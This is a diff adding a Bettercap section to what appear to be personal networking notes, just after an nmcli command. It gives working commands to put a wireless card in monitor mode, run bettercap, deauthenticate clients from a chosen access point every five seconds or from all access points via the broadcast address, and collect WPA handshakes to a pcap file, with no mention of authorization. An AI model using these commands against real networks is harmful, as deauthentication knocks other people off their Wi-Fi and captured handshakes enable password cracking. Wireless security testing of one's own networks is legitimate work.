@@ -85,3 +85,55 @@ List all  active connections:
 ```bash
 nmcli con show --active
 ```
+
+
+## Bettercap
+What is it?
+from website: The Swiss Army knife for WiFi, Bluetooth Low Energy, wireless HID hijacking and IPv4 and IPv6 networks reconnaissance and MITM attacks.
+
+
+### Setup monitoring mode on wireless card
+
+Identify card using tool `iwconfig` and then set it to monitor mode (using `airmon-ng`):
+
+```bash
+sudo airmon-ng start <your_interface>
+```
+
+Then to stop monitoring issue:
+
+```bash
+sudo airmon-ng stop <monitor_interface>
+sudo systemctl restart NetworkManager # or sudo service network-manager restart
+```
+
+### Start bettercap
+
+```bash
+sudo bettercap -iface <monitor_interface>
+```
+
+Keep deauthing clients from the access point with `BSSID DE:AD:BE:EF:DE:AD` every five seconds:
+
+```bash
+> set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on
+```
+
+[Read more](https://www.bettercap.org/modules/wifi/) about wifi module. For bluetooth and others also refer to docs ;).
+[Bluetooth low energy](https://www.bettercap.org/modules/ble/)
+
+
+### Deauth attack
+
+```bash
+sudo bettercap -iface <monitor_interface>
+```
+
+```bash
+> wifi.recon on
+> wifi.show
+> wifi.deauth DE:AD:BE:EF:DE:AD # to deauth specific AP
+> wifi.deauth  ff:ff:ff:ff:ff:ff # to deauth all APs
+```
+
+captured handshakes are stored in `~/bettercap-wifi-handshakes.pcap`
